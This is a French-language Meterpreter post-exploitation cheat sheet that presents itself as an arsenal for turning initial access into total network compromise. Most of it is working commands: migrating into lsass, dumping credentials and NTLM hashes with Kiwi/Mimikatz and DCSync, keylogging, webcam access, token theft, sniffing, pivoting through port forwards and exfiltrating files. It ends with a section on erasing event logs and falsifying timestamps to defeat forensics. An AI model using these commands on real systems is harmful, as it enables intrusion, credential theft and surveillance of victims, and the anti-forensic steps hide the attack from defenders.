# 💀 **METERPRETER : L'ART DE LA POST-EXPLOITATION**

> **Vision OpSec** : Ce guide n'est pas une simple liste de commandes, c'est ton arsenal pour transformer un accès initial en une compromission totale du réseau. Furtivité, persistance et efficacité.

---

## ⚡ 1. Fondamentaux & Architecture

**Meterpreter** est un payload "reflective DLL injection". Il vit exclusivement dans la **RAM**, ne touche jamais le disque (Fileless), et communique via un tunnel chiffré.

| Payload | Type | OpSec | Usage |
| :--- | :--- | :--- | :--- |
| `reverse_tcp` | Staged | 🔴 Moyen | Buffer overflows (stager léger) |
| `reverse_https` | Stageless | 🟢 Élevé | Bypass FW & Camouflage trafic web |
| `bind_tcp` | Direct | 🟡 Risqué | Si la cible n'a pas de sortie internet |

---

## 🛠️ 2. Établir la Session (The Landing)

Une fois le shell obtenu, la règle d'or : **Ne touche à rien avant d'avoir stabilisé.**

```bash
# Identifier l'environnement
sysinfo             # OS, Build, Architecture (x64 vs x86)
getuid              # Identité actuelle
getpid              # Où suis-je injecté ?
```

### 💉 Migration (Furtivité & Stabilité)
Ne reste jamais dans le processus exploité (souvent instable). Migre vers un processus système ou utilisateur pérenne.
```text
ps                  # Lister les processus
migrate <PID>       # Se déplacer (ex: explorer.exe ou svchost.exe)
migrate -N lsass.exe # Migration par nom (nécessite privilèges)
```

---

## 🔍 3. Reconnaissance & Looting

### 📂 Système de fichiers
```text
pwd / ls / cd       # Navigation classique
search -f *.config  # Chercher des fichiers de config (mots de passe)
download / upload   # Exfiltration et transfert d'outils
```

### 🌐 Réseau & Mouvement Latéral
Meterpreter est ta passerelle vers le réseau interne.
```text
ipconfig / arp      # Mapping réseau local
netstat             # Voir les connexions actives (recherche de DC, DB)
portfwd add -l 4444 -p 80 -r 10.0.0.5 # Tunneling : accède au port 80 de la cible interne via ton localhost:4444
```

---

## 👑 4. Élévation & Extraction (The Crown Jewels)

### 🚀 Privilege Escalation
```text
getsystem           # Tentative automatique d'escalade (Named Pipe Impersonation)
# Si échec : background et utilise local_exploit_suggester
```

### 🔑 Extraction d'identifiants
Le module **Kiwi** (Mimikatz intégré) est ton meilleur ami.
```text
load kiwi           # Charger l'extension
creds_all           # Dump TOUS les mots de passe et tickets en mémoire
lsa_dump_sam        # Récupérer les hachages NTLM (SAM)
dcsync_ntlm <user>  # (Si Admin Domaine) Récupérer le hash de n'importe qui
```

---

## 🐍 5. Extensions Avancées

*   **`load sniffer`** : Capture le trafic réseau directement depuis l'interface de la cible.
*   **`load python`** : Exécute des scripts Python complexes sans installer Python sur la cible.
*   **`load incognito`** : Vol de tokens d'impersonnalisation (pour devenir un autre utilisateur sans mot de passe).

---

## 🛡️ 6. Nettoyage & OpSec

Un bon hacker ne laisse pas de traces.
```text
clearev             # Effacer les logs d'événements (Application, System, Security)
timestomp <file> -v # Modifier les dates de création/accès pour tromper le forensic
```

---

## 📝 Cheat Sheet Rapide (The Hacker's Pocket)

| Action | Commande |
| :--- | :--- |
| **Aide contextuelle** | `help` |
| **Passer en fond** | `background` |
| **Shell OS** | `shell` |
| **Screenshot** | `screenshot` |
| **Keylogger** | `keyscan_start` / `keyscan_dump` |
| **Webcam list** | `webcam_list` |
| **Hashdump** | `hashdump` |

---
> **Pro-Tip** : Toujours vérifier l'architecture. Si tu es sur un système `x64` avec un meterpreter `x86`, `getsystem` et `migrate` vers des processus système risquent d'échouer. **Accorde toujours ton payload à l'architecture cible.**
